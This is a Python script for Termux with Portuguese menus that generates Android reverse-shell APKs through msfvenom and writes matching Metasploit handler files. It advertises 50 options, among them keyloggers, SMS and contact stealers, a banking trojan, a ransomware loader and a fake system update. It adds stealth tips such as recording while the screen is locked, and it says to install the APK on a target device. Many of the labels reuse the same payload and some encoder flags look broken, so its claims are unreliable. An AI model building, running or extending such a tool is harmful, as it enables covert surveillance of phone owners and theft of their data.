#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—      â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• 
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— 
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•      â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—
â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•â•šâ•â•â•â•â•â•       â•šâ•â•  â•šâ•â•â•šâ•â•     â•šâ•â•  â•šâ•â•
                              â €â €â €â €â¢€â£€â €â €â €â €â €â €â €â €â €â €â£€â¡€â €â €â €â €
â €â €â €â €                               â €â ™â¢·â£¤â£¤â£´â£¶â£¶â£¦â£¤â£¤â¡¾â ‹â €â €â €â €â €
â €â €â €                               â €â €â£´â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¦â €â €â €â €â €
â €â €                               â €â €â£¼â£¿â£¿â£‰â£¹â£¿â£¿â£¿â£¿â£â£‰â£¿â£¿â£§â €â €â €â €
â €                               â €â €â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â €â €â €
                               â£ â£„â €â¢ â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â¡„â €â£ â£„
                               â£¿â£¿â¡‡â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢¸â£¿â£¿
                               â£¿â£¿â¡‡â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢¸â£¿â£¿
                               â£¿â£¿â¡‡â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢¸â£¿â£¿
                               â£¿â£¿â¡‡â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢¸â£¿â£¿
                               â »â Ÿâ â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â ˆâ »â Ÿ
â €â €â €â €                               â ‰â ‰â£¿â£¿â£¿â¡â ‰â ‰â¢¹â£¿â£¿â£¿â ‰â ‰â €â €â €â €
â €â €â €â €â €â €                               â£¿â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â£¿â €â €â €â €â €â €
â €â €â €â €â €â €                               â£¿â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â£¿â €â €â €â €â €â €
â €â €â €â €â €                               â €â ˆâ ‰â ‰â €â €â €â €â ‰â ‰â â €â €â €â €â €â €                                                      â €â €â €â €â €
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*85)
    print("                    MOBILE SECURITY ASSESSMENT TOOLS")
    print("="*85)
    
    payloads = [
        "[01] Android Reverse TCP Shell",             "[02] Android Reverse HTTP Shell",
        "[03] Android Reverse HTTPS Shell",           "[04] Android Bind TCP Shell",
        "[05] Android Meterpreter Reverse TCP",       "[06] Android Meterpreter Reverse HTTP",
        "[07] Android Meterpreter Reverse HTTPS",     "[08] Android Shell Reverse TCP",
        "[09] Android Shell Bind TCP",                "[10] Android Debug Bridge Backdoor",
        "[11] Android Video Surveillance",            "[12] Android Audio Recording",
        "[13] Android Location Tracker",              "[14] Android SMS Interceptor",
        "[15] Android Call Log Stealer",              "[16] Android Contact List Stealer",
        "[17] Android File Explorer",                 "[18] Android Camera Controller",
        "[19] Android Keylogger",                     "[20] Android Clipboard Monitor",
        "[21] Android Browser Data Stealer",          "[22] Android Social Media Access",
        "[23] Android WiFi Credential Stealer",       "[24] Android Persistent Backdoor",
        "[25] Android Root Exploit Loader",           "[26] Android Banking Trojan",
        "[27] Android Ransomware Loader",             "[28] Android Botnet Client",
        "[29] Android Crypto Miner",                  "[30] Android Custom Exploit",
        "[31] Android Microphone Spy",                "[32] Android Screen Recorder",
        "[33] Android Notification Reader",           "[34] Android App Data Stealer",
        "[35] Android GPS Tracker",                   "[36] Android Remote Admin",
        "[37] Android System Info Collector",         "[38] Android Network Scanner",
        "[39] Android Password Cracker",              "[40] Android Firewall Bypass",
        "[41] Android VPN Tunnel",                    "[42] Android Reverse UDP Shell",
        "[43] Android ICMP Backdoor",                 "[44] Android DNS Tunneling",
        "[45] Android Bluetooth Exploit",             "[46] Android USB Debugging Backdoor",
        "[47] Android Boot Persistence",              "[48] Android Fake System Update",
        "[49] Android Accessibility Exploit",         "[50] Android Multi-Vector Payload"
    ]
    
    # Mostrar em 2 colunas
    col_width = 42
    for i in range(0, 50, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair | [G] Guia RÃ¡pido | [I] InformaÃ§Ãµes")
    print("="*85)

def get_payload_config(payload_type):
    """ObtÃ©m configuraÃ§Ã£o do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrÃ£o baseado no tipo
    default_name = f"android_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saÃ­da [{default_name}]: ").strip() or default_name
    
    if not output_name.endswith('.apk'):
        output_name += '.apk'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Reverse TCP Shell bÃ¡sico'},
        2: {'name': 'android/meterpreter/reverse_http', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'android/meterpreter/reverse_https', 'description': 'Reverse HTTPS Shell criptografado'},
        4: {'name': 'android/meterpreter/bind_tcp', 'description': 'Bind TCP Shell'},
        5: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'android/meterpreter/reverse_http', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'android/meterpreter/reverse_https', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'android/shell/reverse_tcp', 'description': 'Shell Reverse TCP simples'},
        9: {'name': 'android/shell/bind_tcp', 'description': 'Shell Bind TCP'},
        10: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor via ADB'},
        11: {'name': 'android/meterpreter/reverse_tcp', 'description': 'VigilÃ¢ncia por vÃ­deo'},
        12: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Gravador de Ã¡udio remoto'},
        13: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Rastreador de localizaÃ§Ã£o'},
        14: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Interceptador de SMS'},
        15: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de registros de chamadas'},
        16: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de lista de contatos'},
        17: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Explorador de arquivos remoto'},
        18: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Controlador de cÃ¢mera'},
        19: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Keylogger para Android'},
        20: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Monitor de Ã¡rea de transferÃªncia'},
        21: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de dados do navegador'},
        22: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Acesso a redes sociais'},
        23: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de credenciais WiFi'},
        24: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor persistente'},
        25: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Carregador de exploits de root'},
        26: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Troyano bancÃ¡rio'},
        27: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Carregador de ransomware'},
        28: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Cliente de botnet'},
        29: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Minerador de criptomoeda'},
        30: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit personalizado'},
        31: {'name': 'android/meterpreter/reverse_tcp', 'description': 'EspiÃ£o de microfone'},
        32: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Gravador de tela'},
        33: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Leitor de notificaÃ§Ãµes'},
        34: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Roubo de dados de apps'},
        35: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Rastreador GPS avanÃ§ado'},
        36: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Administrador remoto'},
        37: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Coletor de informaÃ§Ãµes do sistema'},
        38: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Scanner de rede integrado'},
        39: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Quebrador de senhas'},
        40: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Bypass de firewall'},
        41: {'name': 'android/meterpreter/reverse_tcp', 'description': 'TÃºnel VPN reverso'},
        42: {'name': 'android/shell/reverse_udp', 'description': 'Reverse UDP Shell'},
        43: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor ICMP'},
        44: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Tunelamento DNS'},
        45: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit Bluetooth'},
        46: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Backdoor USB Debugging'},
        47: {'name': 'android/meterpreter/reverse_tcp', 'description': 'PersistÃªncia no boot'},
        48: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Falsa atualizaÃ§Ã£o de sistema'},
        49: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Exploit de acessibilidade'},
        50: {'name': 'android/meterpreter/reverse_tcp', 'description': 'Payload multi-vetor'}
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("âŒ Tipo de payload invÃ¡lido!")
        return False
    
    print(f"\nğŸ¯ Gerando: {config['description']}")
    print("â³ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-o', output_name
        ]
        
        # Adicionar opÃ§Ãµes especÃ­ficas baseadas no tipo
        if payload_type in [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 44, 45, 46, 47, 48, 49, 50]:
            cmd.extend(['--platform', 'android'])
        
        if payload_type in [24, 47]:  # Persistente
            cmd.extend(['-f', 'apk'])
            cmd.append('--smallest')
            
        if payload_type in [25, 45, 49]:  # Root exploit e exploits
            cmd.extend(['--arch', 'dalvik'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [26, 27, 28, 29]:  # Malwares avanÃ§ados
            cmd.extend(['-f', 'raw'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [40, 41, 44]:  # Bypass e tunneling
            cmd.extend(['-f', 'apk'])
            cmd.append('--keep')
            
        if payload_type == 50:  # Multi-vetor
            cmd.extend(['-f', 'apk', '--encoder', 'x86/shikata_ga_nai', '-i', '3'])
        
        # Executar comando
        print(f"\nğŸ”§ Executando: msfvenom -p {config['name']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\nâœ… Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("âœ… Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\nâŒ Erro ao gerar payload!")
            if "command not found" in result.stderr:
                print("âŒ Metasploit nÃ£o encontrado! Instale com: pkg install metasploit")
            else:
                print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\nâŒ Metasploit nÃ£o encontrado!")
        print("ğŸ“¥ Instale com: pkg install metasploit")
        return False
    except Exception as e:
        print(f"\nâŒ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['name']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
"""

    # ConfiguraÃ§Ãµes especÃ­ficas baseadas no tipo
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    elif payload_type == 42:
        handler_content += "set PAYLOAD android/shell/reverse_udp\n"
    
    # Adicionar mÃ³dulos post-exploitation baseados no tipo
    if payload_type in [11, 18, 32]:  # VÃ­deo, cÃ¢mera, gravaÃ§Ã£o de tela
        handler_content += "set AutoRunScript post/multi/manage/record_mic\n"
    elif payload_type in [13, 35]:  # LocalizaÃ§Ã£o
        handler_content += "set AutoRunScript post/android/manage/geolocate\n"
    elif payload_type in [14, 15, 16, 21, 22, 23, 34]:  # Coleta de dados
        handler_content += "set AutoRunScript post/android/gather/\n"
    elif payload_type in [19, 33]:  # Keylogger e notificaÃ§Ãµes
        handler_content += "set AutoRunScript post/android/manage/keylog\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.replace('.apk', '')}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"ğŸ“ Handler salvo como: {handler_file}")
        print("ğŸ’» Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"âš ï¸  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informaÃ§Ãµes sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell - ConexÃ£o reversa bÃ¡sica via TCP",
        2: "Reverse HTTP Shell - ConexÃ£o via HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - ConexÃ£o criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no dispositivo alvo",
        5: "Meterpreter TCP - Shell avanÃ§ado com mÃºltiplas funÃ§Ãµes",
        6: "Meterpreter HTTP - Meterpreter via HTTP",
        7: "Meterpreter HTTPS - Meterpreter criptografado",
        8: "Shell TCP Simples - Shell bÃ¡sico sem meterpreter",
        9: "Bind TCP Simples - Shell bind bÃ¡sico",
        10: "ADB Backdoor - Backdoor via Android Debug Bridge",
        11: "Video Surveillance - Acesso Ã  cÃ¢mera do dispositivo",
        12: "Audio Recording - GravaÃ§Ã£o de Ã¡udio ambiente",
        13: "Location Tracker - Rastreamento GPS em tempo real",
        14: "SMS Interceptor - InterceptaÃ§Ã£o e leitura de SMS",
        15: "Call Log Stealer - Coleta registros de chamadas",
        16: "Contact Stealer - Rouba lista de contatos",
        17: "File Explorer - NavegaÃ§Ã£o remota em arquivos",
        18: "Camera Controller - Controle remoto de cÃ¢meras",
        19: "Keylogger - Captura de teclas digitadas",
        20: "Clipboard Monitor - Monitoramento da Ã¡rea de transferÃªncia",
        21: "Browser Data Stealer - Roubo de dados do navegador",
        22: "Social Media Access - Acesso a redes sociais",
        23: "WiFi Stealer - Roubo de credenciais WiFi",
        24: "Persistent Backdoor - Backdoor de reinicializaÃ§Ã£o",
        25: "Root Exploit - Tentativa de escalaÃ§Ã£o de privilÃ©gios",
        26: "Banking Trojan - Troyano focado em apps bancÃ¡rios",
        27: "Ransomware Loader - Carregador de ransomware",
        28: "Botnet Client - Cliente para rede de bots",
        29: "Crypto Miner - Minerador de criptomoedas",
        30: "Custom Exploit - Exploit personalizado avanÃ§ado",
        31: "Microphone Spy - GravaÃ§Ã£o de Ã¡udio do microfone",
        32: "Screen Recorder - Captura de tela em tempo real",
        33: "Notification Reader - Leitura de notificaÃ§Ãµes",
        34: "App Data Stealer - Roubo de dados de aplicativos",
        35: "GPS Tracker - Rastreamento GPS contÃ­nuo",
        36: "Remote Admin - Controle administrativo remoto",
        37: "System Info - Coleta de informaÃ§Ãµes do sistema",
        38: "Network Scanner - Scanner de rede integrado",
        39: "Password Cracker - Quebrador de senhas local",
        40: "Firewall Bypass - TÃ©cnicas para bypass de firewall",
        41: "VPN Tunnel - TÃºnel VPN para comunicaÃ§Ã£o",
        42: "Reverse UDP Shell - Shell via protocolo UDP",
        43: "ICMP Backdoor - Backdoor via pacotes ICMP",
        44: "DNS Tunneling - ComunicaÃ§Ã£o via protocolo DNS",
        45: "Bluetooth Exploit - ExploraÃ§Ã£o via Bluetooth",
        46: "USB Debugging - Backdoor via USB debugging",
        47: "Boot Persistence - PersistÃªncia na inicializaÃ§Ã£o",
        48: "Fake Update - Falsa atualizaÃ§Ã£o de sistema",
        49: "Accessibility Exploit - Exploit de acessibilidade",
        50: "Multi-Vector - CombinaÃ§Ã£o de mÃºltiplas tÃ©cnicas"
    }
    
    info = info_texts.get(payload_type, "InformaÃ§Ã£o nÃ£o disponÃ­vel")
    print(f"\nğŸ“‹ InformaÃ§Ãµes do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas especÃ­ficas para o payload"""
    
    tips = {
        1: "ğŸ’¡ Dica: Use para conexÃµes diretas em redes internas",
        2: "ğŸ’¡ Dica: Ideal para bypass de firewalls corporativos",
        3: "ğŸ’¡ Dica: Recomendado para trÃ¡fego externo criptografado",
        8: "ğŸ’¡ Dica: Mais leve que Meterpreter, menos recursos",
        10: "ğŸ’¡ Dica: Requer USB debugging ativado no dispositivo",
        11: "ğŸ’¡ Dica: Pode acionar LED da cÃ¢mera - cuidado!",
        13: "ğŸ’¡ Dica: Funciona mesmo com GPS desligado",
        19: "ğŸ’¡ Dica: Use keyscan_start no meterpreter",
        24: "ğŸ’¡ Dica: Sobrevive a reinicializaÃ§Ãµes do dispositivo",
        25: "ğŸ’¡ Dica: Funciona apenas em dispositivos vulnerÃ¡veis",
        26: "ğŸ’¡ Dica: Foca em aplicativos bancÃ¡rios populares",
        31: "ğŸ’¡ Dica: Grava mesmo com tela bloqueada",
        40: "ğŸ’¡ Dica: Usa mÃºltiplos protocolos para evasÃ£o",
        42: "ğŸ’¡ Dica: Ãštil em redes com restriÃ§Ãµes TCP",
        44: "ğŸ’¡ Dica: Dificilmente detectado por firewalls",
        47: "ğŸ’¡ Dica: PersistÃªncia mÃ¡xima - difÃ­cil remoÃ§Ã£o",
        50: "ğŸ’¡ Dica: Combina as melhores tÃ©cnicas em um sÃ³ payload"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"{tip}")

def show_quick_guide():
    """Mostra um guia rÃ¡pido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÃPIDO")
    print("="*60)
    print("ğŸ“± 50 Payloads Android DisponÃ­veis")
    print("ğŸ”§ Metasploit necessÃ¡rio apenas na geraÃ§Ã£o")
    print("ğŸ“¡ Configure LHOST (seu IP) e LPORT (sua porta)")
    print("ğŸ“¦ Arquivo APK serÃ¡ gerado automaticamente")
    print("ğŸ¯ Handler RC criado para uso imediato")
    print("âš¡ Execute: msfconsole -r handler_[arquivo].rc")
    print("ğŸ“² Instale o APK no dispositivo alvo")
    print("ğŸ”„ Aguarde a conexÃ£o reversa")
    print("="*60)
    print("âš ï¸  USE APENAS PARA TESTES AUTORIZADOS!")
    print("="*60)

def show_all_payloads_info():
    """Mostra informaÃ§Ãµes sobre categorias de payloads"""
    print("\n" + "="*70)
    print("               CATEGORIAS DE PAYLOADS")
    print("="*70)
    print("ğŸ¯ Shells BÃ¡sicos (1-9) - ConexÃµes reversas e bind")
    print("ğŸ“¡ Backdoors (10,24,46,47) - Acesso persistente")
    print("ğŸ‘€ VigilÃ¢ncia (11-13,18,31-33) - CÃ¢mera, Ã¡udio, localizaÃ§Ã£o")
    print("ğŸ“Š Coleta de Dados (14-17,19-23,34,37) - InformaÃ§Ãµes do usuÃ¡rio")
    print("ğŸ›¡ï¸ Exploits (25,45,49) - EscalaÃ§Ã£o de privilÃ©gios")
    print("ğŸ’€ Malwares (26-29) - Troyanos, ransomware, mineradores")
    print("ğŸŒ Rede (38,40-44) - Scanner, bypass, tunneling")
    print("ğŸ”§ UtilitÃ¡rios (36,39) - Admin remoto, password cracker")
    print("ğŸš€ AvanÃ§ados (30,48,50) - TÃ©cnicas combinadas")
    print("="*70)

def main():
    """FunÃ§Ã£o principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opÃ§Ã£o [0-50] ou 'g' para guia: ").strip().lower()
            
            if choice == 'g':
                show_quick_guide()
                input("\nâ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == 'i':
                show_all_payloads_info()
                input("\nâ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\nğŸ‘‹ Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 50:
                show_payload_info(payload_type)
                
                if input("\nğŸ¯ Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\nğŸš€ Iniciando geraÃ§Ã£o do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\nâœ… Payload criado com sucesso!")
                            print(f"ğŸ“ Arquivo: {output_name}")
                            print("âš¡ Handler gerado automaticamente")
                            print("ğŸ“² Instale no dispositivo Android alvo")
                            print("âš ï¸  USE APENAS PARA TESTES AUTORIZADOS!")
                        else:
                            print("\nğŸ’¥ Falha na geraÃ§Ã£o do payload!")
                    
                    input("\nâ Pressione Enter para continuar...")
            
            else:
                print("âŒ OpÃ§Ã£o invÃ¡lida!")
                input("â Pressione Enter para continuar...")
                
        except ValueError:
            print("âŒ Por favor, digite um nÃºmero vÃ¡lido!")
            input("â Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\nğŸ‘‹ Saindo...")
            break

if __name__ == "__main__":
    main()
